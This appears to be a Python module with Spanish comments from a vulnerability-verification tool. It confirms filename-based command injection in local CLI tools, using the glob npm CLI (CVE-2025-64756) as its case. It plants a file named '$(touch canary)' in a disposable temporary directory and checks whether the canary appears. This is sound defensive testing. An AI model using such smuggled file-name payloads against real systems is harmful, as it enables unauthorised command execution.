"""Verificacion dinamica de CVEs en herramientas CLI LOCALES, sin endpoint HTTP ni Docker de por
medio -- un hueco real que wpverify.py/drupalverify.py/joomlaverify.py/genericverify.py no
cubrian: los cuatro asumen un servicio escuchando (`notes.get("endpoint")`), pero algunas clases
de command injection ocurren en herramientas que un analista ejecuta directamente en su propia
maquina, donde el vector es un NOMBRE DE FICHERO que la herramienta encuentra por su cuenta (p.ej.
al listar un directorio con un patron glob) y pasa a una shell sin escapar.

Confirmado en vivo con CVE-2025-64756 (`glob` npm CLI, GHSA-5j98-mcp5-4vw2): `-c`/`--cmd` pasa los
ficheros encontrados a `foregroundChild(cmd, matches, { shell: true })` (src/bin.mts). Se
reprodujo de verdad en un entorno descartable (`npm install glob@11.0.0` en un directorio temporal
vacio, nunca contra un sistema real/en produccion): un fichero llamado literalmente
`$(touch injected_poc)` hizo que ese comando se ejecutara de verdad al listar el directorio.

Deliberadamente acotado a ESTA forma concreta (command injection via nombre de fichero sin
escapar) -- no un framework generico para "cualquier CVE de una herramienta CLI", que seria
adivinar categorias sin tener mas que un solo caso real que las justifique. Si aparece otra forma
real confirmada (p.ej. el payload va en el VALOR de un argumento en vez de en un nombre de
fichero), se amplia entonces con el mismo criterio de "poco a poco" que el resto de los
verificadores de este proyecto."""
from __future__ import annotations

import os
import shutil
import subprocess
import tempfile
from typing import Callable, Optional

from .wpverify import WpVerifyResult, _token


def verify_cli_filename_command_injection(
    setup_cmd: str, run_cmd: str, on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 300.0,
) -> WpVerifyResult:
    """Verifica command injection en una herramienta CLI que pasa nombres de fichero emparejados
    a una shell sin escapar. Sin login, sin red, sin Docker: todo ocurre dentro de un directorio
    temporal DESCARTABLE (creado y borrado aqui mismo), igual de valido que el laboratorio Docker
    de los demas verificadores porque la prueba (un canario que aparece en disco) no depende de
    contenedores -- solo de que el comando se ejecute de verdad.

    setup_cmd: comando de shell que prepara el entorno (p.ej. instalar la version exacta a
    comprobar: "npm install glob@11.0.0"), ejecutado UNA VEZ dentro del directorio temporal recien
    creado, antes de plantar nada.
    run_cmd: comando de shell que invoca la herramienta tal cual la usaria un analista (p.ej.
    'node node_modules/.bin/glob -c echo "**/*"'), ejecutado DESPUES de plantar el fichero-payload,
    dentro del mismo directorio."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    work_dir = tempfile.mkdtemp(prefix="binoracle_cliverify_")
    try:
        step(f"preparando entorno descartable en {work_dir}: {setup_cmd}")
        try:
            setup = subprocess.run(setup_cmd, shell=True, cwd=work_dir, capture_output=True,
                                   text=True, timeout=min(budget_s, 180.0))
        except subprocess.TimeoutExpired as e:
            res.detail = f"timeout preparando el entorno ({setup_cmd}): {e}"
            return res
        res.evidence.update({"setup_cmd": setup_cmd, "setup_returncode": setup.returncode})
        if setup.returncode != 0:
            res.detail = (f"el comando de preparacion fallo (codigo {setup.returncode}): "
                          f"{(setup.stderr or setup.stdout or '')[:500]}")
            res.evidence["setup_stderr_recorte"] = (setup.stderr or "")[:500]
            res.limitations.append("verificacion no intentada: la preparacion del entorno fallo")
            return res

        canary_name = f"binoracle_cli_canary_{_token()}"
        payload_filename = f"$(touch {canary_name})"
        payload_path = os.path.join(work_dir, payload_filename)
        try:
            open(payload_path, "w").close()
        except OSError as e:
            res.detail = f"no se pudo crear el fichero-payload '{payload_filename}': {e}"
            return res
        res.evidence.update({"run_cmd": run_cmd, "payload_filename": payload_filename,
                             "canary_name": canary_name})

        step(f"ejecutando la herramienta tal cual la usaria un analista: {run_cmd}")
        try:
            run = subprocess.run(run_cmd, shell=True, cwd=work_dir, capture_output=True,
                                 text=True, timeout=min(budget_s, 120.0))
        except subprocess.TimeoutExpired as e:
            res.detail = f"timeout ejecutando la herramienta ({run_cmd}): {e}"
            return res
        res.evidence["run_returncode"] = run.returncode
        res.evidence["run_stdout_recorte"] = (run.stdout or "")[:500]

        canary_present = os.path.exists(os.path.join(work_dir, canary_name))
        res.evidence["canario_presente"] = canary_present
        res.ok = True
        if canary_present:
            res.verified = True
            res.detail = (f"COMMAND INJECTION confirmada: el fichero canario '{canary_name}' "
                          f"aparecio DENTRO del directorio de trabajo tras ejecutar '{run_cmd}' "
                          f"sobre un fichero cuyo NOMBRE contenia el payload -- prueba inequivoca "
                          f"de ejecucion de comandos via nombre de fichero sin escapar, nunca una "
                          f"deduccion por codigo de salida")
            step(f"VERIFICADO: {canary_name} aparecio en {work_dir} -- el comando se ejecuto de "
                 f"verdad.")
        else:
            res.detail = (f"se ejecuto '{run_cmd}' sobre un fichero con nombre-payload pero el "
                          f"canario '{canary_name}' nunca aparecio -- no se confirmo command "
                          f"injection (puede que esta version ya este parcheada, o que la "
                          f"herramienta no pase nombres de fichero a una shell sin escapar)")
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step(f"limpiando el directorio de trabajo descartable {work_dir}...")
        shutil.rmtree(work_dir, ignore_errors=True)
